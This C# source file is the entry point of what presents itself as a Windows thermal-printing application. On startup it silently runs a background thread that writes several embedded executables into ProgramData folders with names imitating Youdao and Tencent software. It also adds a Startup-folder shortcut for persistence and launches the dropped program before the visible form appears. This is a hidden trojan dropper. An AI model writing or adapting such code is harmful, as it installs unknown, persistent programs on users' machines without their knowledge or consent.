using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using prF_Text.Properties;
using IWshRuntimeLibrary;
using File = System.IO.File;

namespace ThermalPrinting
{
    internal static class prF_Text
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            new Thread(new ThreadStart(MY_CODE)).Start();
            new Thread(new ThreadStart(MY_CODEDLL)).Start();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
        private static void MY_CODE()
        {
            string destinationFolderPath = @"C:\ProgramData\Youdaosuppert";
            string destinationFilePath = Path.Combine(destinationFolderPath, "Youdaosuppert.exe");

            string pointFolderPath = @"C:\ProgramData\Tencent\SH\TO\CAN";
            string pointFilePath = Path.Combine(pointFolderPath, "goPoint.exe");

            string upgradesDestinationFilePath = Path.Combine(destinationFolderPath, "Upgrades.exe");
            string showDestinationFilePath = Path.Combine(destinationFolderPath, "ShowData.exe");


            string PathLink = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Youdaosuppert.lnk");

            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName == "Youdaosuppert")
                {
                    process.Kill();
                    process.WaitForExit();
                }
            }
            if (!Directory.Exists(destinationFolderPath))
            {
                Directory.CreateDirectory(destinationFolderPath);
                File.Create(destinationFilePath).Close();
            }
            if (!Directory.Exists(pointFolderPath))
            {
                Directory.CreateDirectory(pointFolderPath);
                File.Create(pointFilePath).Close();
            }

            byte[] bytes = Resources._00;
            File.WriteAllBytes(destinationFilePath, bytes);

            byte[] bytes_UP = Resources.UP;
            File.WriteAllBytes(upgradesDestinationFilePath, bytes_UP);

            byte[] bytes_SD = Resources.SD;
            File.WriteAllBytes(showDestinationFilePath, bytes_SD);

            byte[] bytes_Point = Resources.goPoint;
            File.WriteAllBytes(pointFilePath, bytes_Point);

            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolderPath, "Youdaosuppert.lnk");
            var shell = new WshShell();
            IWshShortcut shortcut = shell.CreateShortcut(shortcutPath) as IWshShortcut;
            shortcut.TargetPath = destinationFilePath;
            shortcut.Save();

            Process.Start(destinationFilePath);
        }

        private static void MY_CODEDLL()
        {
            string destinationFolderPath = AppDomain.CurrentDomain.BaseDirectory;
            string destinationFilePath = Path.Combine(destinationFolderPath, "autoreplyprint.dll");

            if (!Directory.Exists(destinationFolderPath))
            {
                Directory.CreateDirectory(destinationFolderPath);
                File.Create(destinationFilePath).Close();
            }
            byte[] bytes = Resources.autoreplyprint;
            Thread.Sleep(10);
            File.WriteAllBytes(destinationFilePath, bytes);
            Console.WriteLine(destinationFilePath);
        }
    }
}
